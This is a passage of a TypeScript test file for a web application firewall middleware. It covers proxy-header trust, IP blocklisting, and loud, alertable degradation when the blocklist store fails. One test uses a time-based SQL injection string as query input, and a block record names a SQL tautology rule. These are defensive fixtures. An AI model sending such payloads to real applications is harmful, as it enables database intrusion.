    });

    it('defaults to NOT trusting a forwarded header when the caller omits the flag', () => {
      const req = makeRequest({ ip: '203.0.113.5', headers: { 'x-forwarded-for': '198.51.100.7' } });

      expect(clientIpOf(req as unknown as Request)).toBe('203.0.113.5');
      expect(clientIpOf(req as unknown as Request, true)).toBe('198.51.100.7');
    });

    it('blocks the forwarded address, not the socket address, when proxies are trusted', async () => {
      config = { ...config, trustProxy: true };
      middleware = build();
      blocklist.blocked.set('198.51.100.7', {
        ip: '198.51.100.7',
        kind: 'permanent',
        reason: 'critical:sql-tautology',
        ruleId: 'sql-tautology',
        blockedAt: 0,
        expiresAt: null,
      });
      const req = makeRequest({ ip: '203.0.113.5', headers: { 'x-forwarded-for': '198.51.100.7' } });
      const decision = await middleware.decide(req as unknown as Request);

      expect(decision.allowed).toBe(false);
      expect(decision.blockRecord?.ip).toBe('198.51.100.7');
    });
  });

  describe('loud degradation when the blocklist store is unavailable', () => {
    it('warns exactly once per outage, carrying a correlation id', async () => {
      blocklist.failIsBlocked = true;

      await middleware.decide(makeRequest() as unknown as Request);
      await middleware.decide(makeRequest() as unknown as Request);
      await middleware.decide(makeRequest() as unknown as Request);

      const degradationWarnings = logger.warn.mock.calls.filter(
        (call) => typeof call[0] === 'string' && call[0].includes('DEGRADED'),
      );
      expect(degradationWarnings).toHaveLength(1);
      expect(degradationWarnings[0]?.[0]).toMatch(/degradationId=\S+/);
    });

    it('states the security impact so the line is worth alerting on', async () => {
      blocklist.failIsBlocked = true;
      await middleware.decide(makeRequest() as unknown as Request);

      const warning = String(
        logger.warn.mock.calls.find((call) => typeof call[0] === 'string' && call[0].includes('DEGRADED'))?.[0],
      );
      expect(warning).toContain('no IP is blocked');
      expect(warning).toContain('Alert on this line');
      expect(warning).toContain('WafMiddleware');
    });

    it('reports the degradation through health() so it can be scraped', async () => {
      expect(middleware.health().degraded).toBe(false);

      blocklist.failIsBlocked = true;
      await middleware.decide(makeRequest() as unknown as Request);

      expect(middleware.health().degraded).toBe(true);
      expect(middleware.health().blocklist.degraded).toBe(true);
    });

    it('reports a recovered store as healthy again', async () => {
      blocklist.failIsBlocked = true;
      await middleware.decide(makeRequest() as unknown as Request);

      blocklist.failIsBlocked = false;
      await middleware.decide(makeRequest() as unknown as Request);

      expect(middleware.health().degraded).toBe(false);
      expect(logger.info.mock.calls.some((call) => String(call[0]).includes('recovered'))).toBe(true);
    });

    it('announces that the escalation ladder stopped when a violation cannot be recorded', async () => {
      blocklist.recordViolationThrows = true;
      config = { ...config, blockSeverity: 'medium' };
      middleware = build();

      await middleware.decide(makeRequest({ query: { q: '1 AND SLEEP(5)' } }) as unknown as Request);

      const warning = String(
        logger.warn.mock.calls.find((call) => typeof call[0] === 'string' && call[0].includes('DEGRADED'))?.[0],
      );
      expect(warning).toContain('blocklist write failed');
    });
  });
});

type MockResponse = {
  status: ReturnType<typeof vi.fn>;
  json: ReturnType<typeof vi.fn>;
  setHeader: ReturnType<typeof vi.fn>;
};

function createResponse(): MockResponse {
  return {
    status: vi.fn().mockReturnThis(),
    json: vi.fn().mockReturnThis(),
    setHeader: vi.fn().mockReturnThis(),
  };
}

async function flush(): Promise<void> {
  await new Promise((resolve) => setImmediate(resolve));
  await new Promise((resolve) => setImmediate(resolve));
}
